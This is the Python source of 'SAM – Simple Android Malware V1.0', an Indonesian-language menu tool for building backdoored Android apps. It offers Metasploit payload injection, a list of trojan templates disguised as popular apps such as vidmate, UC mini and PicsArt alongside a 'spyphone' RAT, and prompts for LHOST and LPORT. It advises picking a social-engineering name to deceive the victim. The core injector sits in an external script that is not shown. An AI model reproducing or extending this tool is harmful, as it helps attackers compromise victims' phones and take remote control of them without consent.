import os
import sys
import time
import random
from datetime import date

red = "\033[1;31m"
gre = "\033[1;32m"
yel = "\033[1;33m"
blu = "\033[1;34m"
put = "\033[2;37m"

#info ip adrres wifi
def getipwifi():
	os.system("ifconfig wlan0 | grep inet | awk 'NR == 1 {print $2}'")
#info ip adrress lan
def getiplan():
	os.system("ifconfig eth0 | grep inet | awk 'NR == 1 {print $2}'")

#fungsi animasi baner runer
def fs(k):
	for i in k + "\n":
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(5. / 500)

#fungsi text berjalan
def r(x):
	for i in x +"\n":
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(10. / 100)

#fungsi ngebersihin layar
def bersih():
	os.system("clear")

#fungsi logo
def logo():
        fs(red+"{"+gre+"---"+red+"}"+blu+"                SAM		   "+red+"{"+gre+"---"+red+"}")
        fs(red+"{"+gre+"---"+red+"}"+blu+"     Simple Android Malware V1.0      "+red+"{"+gre+"---"+red+"}")
        fs(red+"{"+gre+"---"+red+"}"+blu+"          Author by @kimak            "+red+"{"+gre+"---"+red+"}")
        fs(red+"{"+gre+"---"+red+"}"+blu+"  Github https://github.com/K1M4K-ID  "+red+"{"+gre+"---"+red+"}")
        fs(red+"{"+gre+"---"+red+"}"+blu+"        Support by iqbalmh18          "+red+"{"+gre+"---"+red+"}")
        fs(red+"{"+gre+"*"*46+red+"}\n")



#fungsi baner
def baner():
	f = open('asci')
	fs('\033[31;1m'+f.read().center(100))

#fungsi menu
def menu():
	print(red+"{"+gre+"1"+red+"}"+put+" android"+blu+" { termux }")
	print(red+"{"+gre+"2"+red+"}"+put+" installing requirements")
	print(red+"{"+red+"0"+red+"}"+put+" exit")
	print('')

#fungsi jika user pilih 1
def satu():
        bersih()
        logo()
        print(red+"{"+gre+"1"+red+"}"+put+" inject {metasploit}")
        print(red+"{"+gre+"2"+red+"}"+put+" inject backdoor from list ")
        print(red+"{"+gre+"3"+red+"}"+put+" inject backdoor from file ")
        print(red+"{"+gre+"4"+red+"}"+put+" start listerner")
        print(red+"{"+gre+"0"+red+"}"+put+" kembali\n")


#fungsi untuk setup listener metasploit
def set1():
	getnama()
	getlhost()
	getlport()
	lanjutga()

#fungsi untuk nama backdoor
def getnama():
        fs(blu+'masukan  nama  payload  atau backdoor yang ingin\nanda buat  gunakan  teknik  social  enggineering\nuntuk mengelabui si korban'.center(50))
        time.sleep(0.1)
        fs(red+"*"*48)
        nama = str(raw_input(red+"{"+gre+"*"+red+"}"+gre+" nama backdoor ~> "+put))
        fs(red+"*"*48)
        if nama == "":
                fs('jangan kosong cuks')
                time.sleep(2)
                getnama()

#fungsi untuk lhost
def getlhost():
        fs(blu+'sekarang masukan lhost anda sebagai alamat untuk\nterhubung antara payload dan  listerner  example\nIP Local : 192.168.1.1\nForwarder: tes24.first.ovpn')
        time.sleep(0.1)
        fs(red+"*"*48)
        lh   = str(raw_input(red+"{"+gre+"*"+red+"}"+gre+" lhost         ~> "+put))
        fs(red+"*"*48)
        if lh == "":
                fs("wajib di isi . . .")
                time.sleep(2)
                getlhost()

#fungsi getlport
def getlport():
        fs(blu+"selanjutnya anda  masukan port anda, port disini\ndigunakan  sebagai  pelabuhan atau tempat dimana\ndata  akan  dituju, example  port  untuk android\nanda bisa memasukan 4 digit misal 4444,8888,8080\nterserah kalian")
        time.sleep(0.1)
        fs(red+"*"*48)
        lp   = str(raw_input(red+"{"+gre+"*"+red+"}"+gre+" lport         ~> "+put))
        fs(red+"*"*48)
        if lp == "":
                fs("wajib di isi . . .")
                time.sleep(2)
                getlport()

#fungsi lanjut atau TIDAK
def lanjutga():
        fs(blu+"apakah anda sudah yakin??[y/n]")
        time.sleep(0.1)
        fs(red+"*"*48)
        opsi = str(raw_input(red+"{"+gre+"*"+red+"}"+gre+" yes/no        ~> "+put))
        fs(red+"*"*48)
        if opsi == "y":
                fs("please wait . . .")
                time.sleep(2)

#fungsi untuk backdoor template
def set2():
	fs(red+"_"*48)
	fs(red+"|No|"+put+"  Name Payload"+red+"    |        Descriptions    |")
	fs(red+"|----------------------------------------------|")
	fs(red+"|"+gre+"01"+red+"|"+put+" spyphone    "+red+"     |      rat aplication    |")
	fs(red+"|"+gre+"02"+red+"|"+put+" speedtest   "+red+"     |    speedtest aplication|")
	fs(red+"|"+gre+"03"+red+"|"+put+" vidmate     "+red+"     |     download mp3,mp4   |")
	fs(red+"|"+gre+"04"+red+"|"+put+" wifi wps    "+red+"     |    attack wps password |")
	fs(red+"|"+gre+"05"+red+"|"+put+" uc mini     "+red+"     |          browser       |")
	fs(red+"|"+gre+"06"+red+"|"+put+" keyboard    "+red+"     |      keyboard hacker   |")
	fs(red+"|"+gre+"07"+red+"|"+put+" g45         "+red+"     |     multi media player |")
	fs(red+"|"+gre+"08"+red+"|"+put+" design      "+red+"     |       editing image    |")
	fs(red+"|"+gre+"09"+red+"|"+put+" droidsql    "+red+"     |    android sql hacking |")
	fs(red+"|"+gre+"10"+red+"|"+put+" aveplayer   "+red+"     |       multimedia mp3   |")
	fs(red+"|"+gre+"11"+red+"|"+put+" indoxxi     "+red+"     |    indoxxi movie player|")
	fs(red+"|"+gre+"12"+red+"|"+put+" picsart pro "+red+"     |      edditing image    |")
	fs(red+"|----------------------------------------------|")
	x = str(raw_input(red+"{"+gre+"*"+red+"}"+gre+" choice ~> "+put))


#fungsi inject payload, code by saydog
def set3():
	fs(red+"please wait . . .")
	time.sleep(3)
	os.system("python3 .sam/android/inject.py")

#jika user pilih satu di menu kali
def kali():
	satu()
	x = str(input(red+"{"+gre+"*"+red+"}"+gre+" choice ~> "+put+""))
	if x == '1':
		bersih()
		logo()
		set1()

	elif x == '2':
		bersih()
		logo()
		set2()

	elif x == '3':
		bersih()
		logo()
		while True:
			set3()
			x = str(raw_input(red+"                                        {ulangi}"))
			if x == "":
				set3()
	else:
		fs(gre+"{"+red+"!"+gre+"}"+blu+" masukan input dengan benar!!"+put)

#fungsi pilih menu
def main():
	bersih()
	baner()
	menu()
	x = str(input(red+"{"+gre+"*"+red+"}"+gre+" choice ~> "+put))
	print ''
	if x == "1":
		kali()
		main()
	elif x == "2":
		fs("sabar, kalo kata bapak owi . . . muehehe")
		time.sleep(3)
		main()
	else:
		fs("terima kasih sudah mampir . . .")
		exit()

main()
